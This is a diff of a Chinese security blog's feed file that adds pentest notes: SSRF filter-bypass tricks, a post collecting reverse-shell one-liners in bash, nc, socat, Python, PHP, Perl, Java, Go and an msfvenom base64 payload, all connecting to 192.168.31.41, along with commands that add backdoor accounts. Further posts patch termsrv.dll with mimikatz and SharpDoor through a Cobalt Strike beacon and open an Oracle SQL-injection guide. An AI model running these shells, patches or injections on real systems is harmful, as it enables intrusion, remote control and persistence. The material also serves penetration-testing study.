@@ -3067,7 +3067,15 @@
 <li>SSRF 的类型为无状态型 SSRF ，即不管你请求的端口是否开放、协议是否支持、网站是否能访问 返回的状态都是一样的，你无法通过它扫描端口开放情况和使用 file 协议读取本地信息。</li>
 <li>不支持 302 跳转</li>
 </ul>
-<h2 id="0x04-挖掘-技巧"><a href="#0x04-挖掘-技巧" class="headerlink" title="0x04 挖掘+技巧"></a>0x04 挖掘+技巧</h2><h3 id="挖掘漏洞："><a href="#挖掘漏洞：" class="headerlink" title="挖掘漏洞："></a>挖掘漏洞：</h3><p>对外发起网络请求的地方都可能存在SSRF漏洞，列举<br>图片加载下载，分享页面，在线翻译，未公开的api（从远程服务器请求资源<br>文件处理，编码处理, 属性信息处理。</p>
+<h2 id="0x04-挖掘-技巧"><a href="#0x04-挖掘-技巧" class="headerlink" title="0x04 挖掘+技巧"></a>0x04 挖掘+技巧</h2><h3 id="挖掘漏洞："><a href="#挖掘漏洞：" class="headerlink" title="挖掘漏洞："></a>挖掘漏洞：</h3><p>对外发起网络请求的地方都可能存在SSRF漏洞，列举<br>图片加载下载，分享页面，在线翻译，未公开的api（从远程服务器请求资源<br>文件处理，编码处理, 属性信息处理。<br>数据库内置功能<br>邮件系统<br>文件处理<br>在线处理工具<br>。。。</p>
+<h3 id="举几个例子"><a href="#举几个例子" class="headerlink" title="举几个例子"></a>举几个例子</h3><ol>
+<li>在线识图，在线文档翻译，分享，订阅等，这些有的都会发起网络请求。</li>
+<li>根据远程URL上传，静态资源图片等，这些会请求远程服务器的资源。</li>
+<li>数据库的比如mongodb的copyDatabase函数，这点看猪猪侠讲的吧，没实践过。</li>
+<li>邮件系统就是接收邮件服务器地址这些地方。</li>
+<li>文件就找ImageMagick，xml这些。</li>
+<li>从URL关键字中寻找，比如：source,share,link,src,imageurl,target等。</li>
+</ol>
 <h3 id="挖掘方式："><a href="#挖掘方式：" class="headerlink" title="挖掘方式："></a>挖掘方式：</h3><p>分为两大类：1、web功能点 2、数据包传参</p>
 <p><img src="/2020/12/22/ssrf%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7/ssrf%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7/1.jpg" alt></p>
 <h3 id="内网服务探测原理分析"><a href="#内网服务探测原理分析" class="headerlink" title="内网服务探测原理分析"></a>内网服务探测原理分析</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;myip.top&#x2F;302.php?url&#x3D;dict:&#x2F;&#x2F;10.105.44.71:8080</span><br></pre></td></tr></table></figure>
@@ -3084,13 +3092,32 @@
 <p>输入<a href="https://link.zhihu.com/?target=http%3A//ceye.io">http://ceye.io</a>却发现并没有回显请求，这是因为这种地方一般会对<strong>后缀</strong>做一个检测，如果不是jpg或者其他图片后缀的话并不会通过，不过好在<a href="https://link.zhihu.com/?target=http%3A//ceye.io">http://ceye.io</a>是很强大的，我们可以随便构造，<a href="https://link.zhihu.com/?target=http%3A//abcdef.ceye.io/ichunqiu.jpg">http://abcdef.ceye.io/ichunqiu.jpg</a>, 对其进行输入，再去观察有无回显。</p>
 <p><strong>绕过</strong></p>
 <ul>
-<li>@</li>
-<li>添加端口号</li>
-<li>短网址绕过</li>
-<li>指向任意ip的域名绕过 xip.io</li>
-<li>p限制绕过的话就利用进制转换（十进制、八进制、十六进制这些）</li>
-<li>协议绕过（只支持http(s)的话可以构造302跳转再转换协议、后面有提到。）</li>
-<li><strong>DNS rebinding</strong></li>
+<li><p>@</p>
+</li>
+<li><p>[::]:80 localhost</p>
+</li>
+<li><p>添加端口号</p>
+</li>
+<li><p>短网址绕过</p>
+</li>
+<li><p>利用Enclosed alphanumerics  ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ</p>
+</li>
+<li><p>利用句号127。0。0。1</p>
+</li>
+<li><p>指向任意ip的域名绕过 xip.io</p>
+</li>
+<li><p>p限制绕过的话就利用进制转换（十进制、八进制、十六进制这些）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可以是十六进制，八进制等。</span><br><span class="line">115.239.210.26  &gt;&gt;&gt;  16373751032</span><br><span class="line">首先把这四段数字给分别转成16进制，结果：73 ef d2 1a</span><br><span class="line">然后把 73efd21a 这十六进制一起转换成8进制</span><br><span class="line">记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1  &gt;&gt;&gt;  http:&#x2F;&#x2F;0177.0.0.1&#x2F; &gt;&gt;&gt;  http:&#x2F;&#x2F;2130706433&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;192.168.0.1  &gt;&gt;&gt;  http:&#x2F;&#x2F;3232235521&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;192.168.1.1  &gt;&gt;&gt;  http:&#x2F;&#x2F;3232235777&#x2F;</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<ul>
+<li><p>协议绕过（只支持http(s)的话可以构造302跳转再转换协议、后面有提到。）</p>
+</li>
+<li><p><strong>DNS rebinding</strong></p>
+</li>
 </ul>
 <p>dns重绑定可以利用与ssrf绕过、bypass同源策略等</p>
 <p>1、 特定域名ttl=0</p>
@@ -3546,6 +3573,205 @@
 <p>Tomcat put上传 CVE-2017-12615 工具传送门：</p>
 <h4 id="4-、-注入漏洞getshell"><a href="#4-、-注入漏洞getshell" class="headerlink" title="4 、 注入漏洞getshell"></a>4 、 注入漏洞getshell</h4><p><a href="https://choge.top/2020/03/19/MsSQL%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">https://choge.top/2020/03/19/MsSQL%E6%B3%A8%E5%85%A5/</a></p>
 <h4 id="5、-远程命令执行"><a href="#5、-远程命令执行" class="headerlink" title="5、 远程命令执行"></a>5、 远程命令执行</h4><p>Linux/Windows反弹shell，脚本语言、powershell反弹shell，Kali/Cobalt Strike等各种上线方法。主要是靠反弹shell进行上线。</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>linux反弹shell总结/linux反弹shell总结</title>
+    <url>/2021/01/20/linux%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/linux%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>​    总结一下linux根据各种环境来反弹一个shell。</p>
+<h2 id="0x02-正片"><a href="#0x02-正片" class="headerlink" title="0x02 正片"></a>0x02 正片</h2><h3 id="1、Bash反弹一句话"><a href="#1、Bash反弹一句话" class="headerlink" title="1、Bash反弹一句话"></a>1、Bash反弹一句话</h3><p>这个再常规不过了，不过这里面有很多细小的知识点，比如管道符、重定向，linux一切皆文件。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root<span class="comment"># bash -i &gt;&amp; /dev/tcp/192.168.31.41/8080 0&gt;&amp;1</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2、-nc工具反弹"><a href="#2、-nc工具反弹" class="headerlink" title="2、 nc工具反弹"></a>2、 nc工具反弹</h3><p> 需要注意的点就是现在linux装的许多都是阉割版的nc。反弹shell的交互性也差很多。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc 192.168.31.41 8080 -t -e /bin/bash</span><br></pre></td></tr></table></figure>
+
+<h3 id="3、-socat反弹一句话"><a href="#3、-socat反弹一句话" class="headerlink" title="3、 socat反弹一句话"></a>3、 socat反弹一句话</h3><p>监听：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">socat TCP-LISTEN:14433 -</span><br></pre></td></tr></table></figure>
+
+<p>反弹：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;tmp&#x2F;socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:192.168.31.41:14433</span><br></pre></td></tr></table></figure>
+
+<h3 id="4、-脚本一句话反弹"><a href="#4、-脚本一句话反弹" class="headerlink" title="4、 脚本一句话反弹"></a>4、 脚本一句话反弹</h3><p>这个也是最近测的一个运维平台中出现的问题，可以调用这个平台的一些脚本模块来反弹shell</p>
+<h4 id="4-1-python脚本反弹"><a href="#4-1-python脚本反弹" class="headerlink" title="4.1 python脚本反弹"></a>4.1 python脚本反弹</h4><p>python可以利用的模块也比较多，比如python2的os模块</p>
+<p>python3subprocess用的多一点 (参数c,code?)</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect("192.168.31.41",14433);os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'</span></span><br></pre></td></tr></table></figure>
+
+<p>dup2将文件描述符复制。</p>
+<h4 id="4-2-php脚本反弹"><a href="#4-2-php脚本反弹" class="headerlink" title="4.2 php脚本反弹"></a>4.2 php脚本反弹</h4><p>参数r（raw?）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("192.168.31.41",14433);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="4-3-java脚本反弹"><a href="#4-3-java脚本反弹" class="headerlink" title="4.3 java脚本反弹"></a>4.3 java脚本反弹</h4><p>说到Java发弹shell，网上所有的java反弹shell使用的都是：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">r &#x3D; Runtime.getRuntime()</span><br><span class="line">p &#x3D; r.exec([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;192.168.31.41&#x2F;8080;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>首先<code>[&quot;a&quot;,&quot;b&quot;,&quot;c] as String[]</code>这种写法没有见过，至少在jdk1.8上面测试是失败的，正常的写法应该是<code>new String[]{&quot;a&quot;,&quot;b&quot;,&quot;c&quot;}</code>这种写法。那么上述的写法就变为：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Runtime r = Runtime.getRuntime();</span><br><span class="line">Process p = r.exec(<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"</span>&#125;);</span><br><span class="line">p.waitFor();</span><br></pre></td></tr></table></figure>
+
+<p>可以发现能够成功地反弹shell。</p>
+<p>举一反三，既然上述的这种可以，那么下面这种也同样可以：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Runtime r = Runtime.getRuntime();</span><br><span class="line">Process p = r.exec(<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1"</span>&#125;);</span><br><span class="line">p.waitFor();</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://my.oschina.net/u/4587690/blog/4416202" target="_blank" rel="noopener">https://my.oschina.net/u/4587690/blog/4416202</a></p>
+<h4 id="4-4-perl-脚本反弹"><a href="#4-4-perl-脚本反弹" class="headerlink" title="4.4 perl 脚本反弹"></a><strong>4.4 perl 脚本反弹</strong></h4><p>这块不是很熟</p>
+<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">perl -e <span class="string">'use Socket;$i="192.168.31.41";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="4-5-golang-反弹"><a href="#4-5-golang-反弹" class="headerlink" title="4.5 golang  反弹"></a>4.5 golang  反弹</h4><p>网上还有一些完整的 我这个只是举个例子之后再深入</p>
+<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"net"</span></span><br><span class="line">	<span class="string">"os"</span></span><br><span class="line">	<span class="string">"os/exec"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	conn, err := net.Dial(<span class="string">"tcp"</span>, <span class="string">"192.168.31.41:14433"</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		os.Exit(<span class="number">1</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	cmd := exec.Command(<span class="string">"/bin/bash"</span>)</span><br><span class="line">	cmd.Stdin = conn</span><br><span class="line">	cmd.Stdout = conn</span><br><span class="line">	cmd.Stderr = conn</span><br><span class="line">	cmd.Run()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://yq.aliyun.com/articles/683332" target="_blank" rel="noopener">https://yq.aliyun.com/articles/683332</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/33207035" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/33207035</a></p>
+<h3 id="5、msf生成"><a href="#5、msf生成" class="headerlink" title="5、msf生成"></a>5、msf生成</h3><p>这里很多我例举一个python的生成</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -l payloads |grep <span class="string">'reverse python'</span></span><br><span class="line">msfvenom -p cmd/unix/reverse python lhost=192.168.31.41 -lport=14433 R</span><br></pre></td></tr></table></figure>
+
+<p>然后就会生成一段base64加密的</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">"exec('aW1wb3J0IHNvY2tldCAgICAgICAgLCBzdWJwcm9jZXNzICAgICAgICAsIG9zICAgICAgICA7ICBob3N0PSIxOTIuMTY4LjMxLjQxIiAgICAgICAgOyAgcG9ydD0xNDQzMyAgICAgICAgOyAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVUICAgICAgICAsIHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICAgIDsgIHMuY29ubmVjdCgoaG9zdCAgICAgICAgLCBwb3J0KSkgICAgICAgIDsgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgICAgLCAwKSAgICAgICAgOyAgb3MuZHVwMihzLmZpbGVubygpICAgICAgICAsIDEpICAgICAgICA7ICBvcy5kdXAyKHMuZmlsZW5vKCkgICAgICAgICwgMikgICAgICAgIDsgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ=='.decode('base64'))"</span></span><br></pre></td></tr></table></figure>
+
+<p>这段和之前用的dup2解密出来的一样。</p>
+<h2 id="0x03-利用之后出现的问题"><a href="#0x03-利用之后出现的问题" class="headerlink" title="0x03 利用之后出现的问题"></a>0x03 利用之后出现的问题</h2><p>交互性非常的差：虚拟回显信息与可交互性非常的差和不稳定</p>
+<p>问题1： 获取的虚拟终端没有交互性，我们想给添加的账号设置密码，无法完成。 </p>
+<p><strong>问题2</strong>：标准的错误输出无法显示，无法正常使用vim等文本编辑器等； </p>
+<p>问题3： 获取的目标主机的虚拟终端使用非常不稳定，很容易断开连接。</p>
+<p>简述一下（现在可能对安全测试的影响不大）：</p>
+<h3 id="1、-一句话添加账号"><a href="#1、-一句话添加账号" class="headerlink" title="1、 一句话添加账号"></a>1、 一句话添加账号</h3><h4 id="1-1、-chpasswd"><a href="#1-1、-chpasswd" class="headerlink" title="1.1、 chpasswd"></a>1.1、 chpasswd</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">useradd newuser;echo &quot;newuser:password&quot;|chpasswd</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-2、-useradd-p"><a href="#1-2、-useradd-p" class="headerlink" title="1.2、 useradd -p"></a>1.2、 useradd -p</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">例子： useradd -p encrypted_password newuser</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">useradd -p &#96;openssl passwd 123456&#96; guest</span><br><span class="line"></span><br><span class="line">useradd -p &quot;$(openssl passwd 123456)&quot; guest</span><br><span class="line"></span><br><span class="line">user_password&#x3D;&quot;&#96;openssl passwd 123456&#96;&quot;</span><br><span class="line">useradd -p &quot;$user_password&quot; guest</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-3、-echo-e"><a href="#1-3、-echo-e" class="headerlink" title="1.3、 echo -e"></a>1.3、 echo -e</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">useradd newuwer;echo -e &quot;123456n123456n&quot; |passwd newuser</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2、-python标准虚拟终端获取"><a href="#2、-python标准虚拟终端获取" class="headerlink" title="2、 python标准虚拟终端获取"></a>2、 python标准虚拟终端获取</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;</span><br></pre></td></tr></table></figure>
+
+<p>交互式虚拟终端。</p>
+<p><a href="https://www.anquanke.com/post/id/87017" target="_blank" rel="noopener">https://www.anquanke.com/post/id/87017</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>mimikatz/多重利用</title>
+    <url>/2021/01/28/mimikatz/%E5%A4%9A%E9%87%8D%E5%88%A9%E7%94%A8/</url>
+    <content><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>​    因为多次看到mimikatz的文章，这个内网渗透神器的功能实在是太多了，写一篇杂续，后面看到的就持续更新。</p>
+<h2 id="0x02-正片"><a href="#0x02-正片" class="headerlink" title="0x02 正片"></a>0x02 正片</h2><h3 id="一、-PC单用户限制3389登录的绕过方式"><a href="#一、-PC单用户限制3389登录的绕过方式" class="headerlink" title="一、 PC单用户限制3389登录的绕过方式"></a>一、 PC单用户限制3389登录的绕过方式</h3><h4 id="一、问题"><a href="#一、问题" class="headerlink" title="一、问题"></a>一、问题</h4><p>如果rdp服务启用，在登陆会提示：其他用户当前已登录到此计算机。如果继续，则该用户必须断开与此计算机的连接。是否仍要登录？1、那么原来的Administrator管理员用户时对方就会被我们直接挤下线，返回到登录界面。2、登录新建的90sec管理员用户时也会提示。</p>
+<h4 id="二、-解决"><a href="#二、-解决" class="headerlink" title="二、 解决"></a>二、 解决</h4><p>1、 利用Mimikatz法国神器安装RDP补丁来解决单用户登录的问题，如果返回“<strong>TermService”service patched</strong>“则说明安装成功，不足之处就是目标主机在<strong>重启系统后便会失效</strong>。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">Privilege &#39;20&#39; OK</span><br><span class="line"></span><br><span class="line">mimikatz # ts::multirdp</span><br><span class="line">&quot;TermService&quot; service patched</span><br></pre></td></tr></table></figure>
+
+<p>2、 题外话解决</p>
+<p>利用RDPWrap来解决单用户登录的问题，它能恢复远程桌面服务被阉割的功能，适用于Windows Vista、7、8、8.1、10。</p>
+<p>执行install.bat进行安装，在安装完成后释放rdpwrap.dll和rdpwrap.ini至C:\Program Files\RDP Wrapper文件夹，<strong>rdpwrap.dll</strong>会被注入到同<strong>termsrv.dll</strong>相同的进程(svchost.exe可以用Process Explorer查看) 。</p>
+<p><strong>注：</strong></p>
+<p>(1) Windows 10家庭版默认不能开启远程桌面，因为微软对其进行了限制，不过我们可以用rdpwrap来恢复远程桌面功能，直接用RDPWInst.exe -s -i -o命令将其安装在System32，默认安装在Program Files。<br>(2) 有时在执行uninstall.bat卸载后发现TermService服务是开启的，但3389远程桌面仍然无法连接，这时我们需要重新开启3389远程桌面。<br>(3) 如失败可尝试更新rdpwrap.ini</p>
+<p>3、 010Editor</p>
+<p>利用010 Editor手动修改termsrv.dll对应的16进制来解决单用户登录的问题，打开termsrv.dll查找8B 99 3C 06 00 00 8B B9 38 06 00 00，替换为B8 00 01 00 00 89 81 38 06 00 00 90，将修改好的termsrv.dll替换到System32目录下，替换前必须先停止TermService服务。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">net stop TermService /y       /y自动回答yes</span><br><span class="line">copy termsrv.dll C:\Windows\System32 /y</span><br><span class="line">net start TermService</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/01/28/mimikatz/%E5%A4%9A%E9%87%8D%E5%88%A9%E7%94%A8/640.png" alt="640"></p>
+<p><strong>注：</strong>如果停止TermService服务还是不能替换System32目录下termsrv.dll，可能是因为它的权限问题，可尝试使用takeown、icacls命令来修改termsrv.dll文件权限，然后再替换该文件就可以了。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">takeown &#x2F;f C:\Windows\system32\termsrv.dll &#x2F;a</span><br><span class="line"></span><br><span class="line">icacls C:\Windows\system32\termsrv.dll &#x2F;grant &quot;administrators&quot;:(F)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">takeown &#x2F;f * &#x2F;a &#x2F;r &#x2F;d y</span><br><span class="line">#强制将当前目录下的所有文件及文件夹、子文件夹下的所有者更改为管理员组(administrators)命令：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cacls d:documents*.* &#x2F;T &#x2F;G administrators:F</span><br><span class="line">#将所有d:documents目录下的文件、子文件夹的NTFS权限修改为仅管理员组(administrators)完全控制(删除原有所有NTFS权限设置)：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cacls d:documents*.* &#x2F;T &#x2F;E &#x2F;G administrators:F</span><br><span class="line">#在原有d:documents目录下的文件、子文件夹的NTFS权限上添加管理员组(administrators)完全控制权限(并不删除原有所有NTFS权限设置)：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cacls ServerDocuments%username%我的文档 &#x2F;t &#x2F;e &#x2F;r &quot;mddqdomain admins&quot;</span><br><span class="line">cacls ServerDocuments%username%桌面 &#x2F;t &#x2F;e &#x2F;r &quot;mddqdomain admins&quot;</span><br><span class="line">#取消管理员组(administrators)完全控制权限(并不删除原有所有NTFS权限设置)：</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">通过这二个命令可以实现批量夺取文件夹、文件所有者权限和添加管理员组完全控制权限。</span><br></pre></td></tr></table></figure>
+
+<p>4、 利用SharpDoor自动修改termsrv.dll对应的16进制来解决单用户登录的问题，不过该项目在部分Windows 10中获取到的Termsrv.dll版本信息可能有误，所以没能成功执行替换Termsrv.dl的16进制。</p>
+<p>​    这里我们必须先确定目标Termsrv.dll版本，然后再修改SharpDoor源码并重新编译，主要修改源码中需要替换的16进制和对应的Termsrv.dll版本信息就可以了。</p>
+<p><img src="/2021/01/28/mimikatz/%E5%A4%9A%E9%87%8D%E5%88%A9%E7%94%A8/2.png" alt="2"></p>
+<p><img src="/2021/01/28/mimikatz/%E5%A4%9A%E9%87%8D%E5%88%A9%E7%94%A8/3.png" alt="3"></p>
+<p><img src="/2021/01/28/mimikatz/%E5%A4%9A%E9%87%8D%E5%88%A9%E7%94%A8/4.png" alt="4"></p>
+<p><strong>注：</strong>SharpDoor项目中还有一个好处就是能够利用CobaltStrike中的execute-assembly命令将该程序直接加载到内存中执行，最终实现无落地文件执行，并且也能够达到一定的免杀效果。</p>
+<p>唯一不足就是获取termsrv.dll版本信息不是十分准确.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">beacon&gt; execute-assembly C:\Users\******\Desktop\SharpDoor.exe</span><br><span class="line">[*] Tasked beacon to run .NET program: SharpDoor.exe</span><br><span class="line">[+] host called home, sent: 115755 bytes</span><br><span class="line">[+] received output:</span><br><span class="line"></span><br><span class="line">Allow Multiple RDP (Remote Desktop) Sessions By Patching termsrv.dll File</span><br><span class="line">[*] Termsrv.dll Version : 10.0.17134.1067</span><br><span class="line">[*] Stop termservice</span><br><span class="line">[*] Backup termsrv.dll to C:\Users\Public\termsrv.dll</span><br><span class="line"></span><br><span class="line">[+] received output:</span><br><span class="line"></span><br><span class="line">[*] Attempting to patch termsrv.dll</span><br><span class="line"></span><br><span class="line">Original File Hash : 24ff1f89f2ec3f5561c34810c8328726</span><br><span class="line">Patched File Hash : 4cec28b4c00002245dffc8346be0cc11</span><br><span class="line"></span><br><span class="line">[*] C:\Users\Public\termsrv.patch.dll was patched successfully</span><br><span class="line"></span><br><span class="line">[*] Setting Registry Terminal Server\fSingleSessionPerUser to 0</span><br><span class="line">[*] Setting Registry Terminal Server\TSAppAllowList\fDisabledAllowList to 1</span><br><span class="line">[*] Start termservice</span><br><span class="line">[*] Done</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://mp.weixin.qq.com/s/6R3bV2l3cF9ftwWaff4JjQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/6R3bV2l3cF9ftwWaff4JjQ</a></p>
+<p><a href="https://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247484743&idx=1&sn=401ef3c90b6f932c7d176d4c16d2b0e3" target="_blank" rel="noopener">查询和开启3389</a></p>
+<p><a href="https://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247486187&idx=1&sn=df0648c1579dcd8bee69f12c6e65f3a4" target="_blank" rel="noopener">组策略限制3389登录绕过</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>Orancle注入总结/1</title>
+    <url>/2021/01/29/Orancle%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1/</url>
+    <content><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>​    Orancle数据库常用于一些大型公司，通常都配合Java后端来使用。 现在所在的公司平时测试中也会惊颤刚看到Oracle注入的漏洞，所以总结一下注入的过程，从如何发现注入点到数据的获取。  之后希望能从注入点中拿到shell。</p>
+<h2 id="0x02-正片"><a href="#0x02-正片" class="headerlink" title="0x02 正片"></a>0x02 正片</h2><h3 id="第一步、-寻找并判断注入点"><a href="#第一步、-寻找并判断注入点" class="headerlink" title="第一步、 寻找并判断注入点"></a>第一步、 寻找并判断注入点</h3><h4 id="注意：-避免使用and-1-1这样的语句"><a href="#注意：-避免使用and-1-1这样的语句" class="headerlink" title="注意： 避免使用and 1=1这样的语句"></a>注意： 避免使用<code>and 1=1</code>这样的语句</h4><h5 id="数字型："><a href="#数字型：" class="headerlink" title="数字型："></a>数字型：</h5><p>数字型的注入和其他数据库时一样，构造<strong>加减乘除</strong>的条件来判断注入。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#通过 &lt;&gt; 来判断 相当于!&#x3D;</span><br><span class="line"></span><br><span class="line">?id&#x3D;1+and+1&lt;&gt;6--+ #返回为真 页面正常</span><br><span class="line">?id&#x3D;1+and+1&lt;&gt;1--+ #返回为假 页面异常</span><br><span class="line"></span><br><span class="line">#通过 加减法来判断</span><br><span class="line"></span><br><span class="line">?id&#x3D;1 #返回id,为1的内容</span><br><span class="line">?id&#x3D;2-1  #返回为1的内容</span><br><span class="line"></span><br><span class="line">#通过数据库报错来判断</span><br><span class="line"></span><br><span class="line">?id&#x3D;1 #返回为正常</span><br><span class="line">?id&#x3D;1&#x2F;0 #返回异常</span><br><span class="line"></span><br><span class="line"># 通过注释符来判断(多行注释:&#x2F;**&#x2F;,单行注释:--)</span><br><span class="line"></span><br><span class="line">?id&#x3D;1 #返回为正常</span><br><span class="line">?id&#x3D;1&#x2F;*v1rus*&#x2F; #也返回正常</span><br><span class="line"></span><br><span class="line">?id&#x3D;1 #返回为正常</span><br><span class="line">?id&#x3D;1--v1rus #也返回正常</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="字符型："><a href="#字符型：" class="headerlink" title="字符型："></a>字符型：</h5><p>字符型的注入和mysql差不多，存在闭合引用符号的问题，后续用单行注释解决剩下的单引号。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#通过&lt;&gt;来判断</span><br><span class="line"></span><br><span class="line">?name&#x3D;loecho&#39;+and+1&lt;&gt;6--+ #返回正常</span><br><span class="line">?name&#x3D;loecho&#39;+and+1&lt;&gt;1--+ #返回异常</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#使用字符串拼接符’||’，通过判断拼接符是否执行，从而判断是否存在注入</span><br><span class="line"></span><br><span class="line">?name&#x3D;lo&#39;||&#39;echo #返回正常    &#39;||user||&#39;</span><br><span class="line">?name&#x3D;lo&#39;||&#39;haha #返回异常</span><br></pre></td></tr></table></figure>
+
+<h3 id="第二步、-利用并查询数据"><a href="#第二步、-利用并查询数据" class="headerlink" title="第二步、 利用并查询数据"></a>第二步、 利用并查询数据</h3><p><strong><em>有回显的情况：</em></strong></p>
+<h4 id="1、-联合查询"><a href="#1、-联合查询" class="headerlink" title="1、 联合查询"></a>1、 联合查询</h4><p><strong>即利用union select将想要查询的数据显示在页面上</strong>，构造正常语句，成功执行SQL语句查询数据</p>
+<ul>
+<li>具体步骤如下:</li>
+</ul>
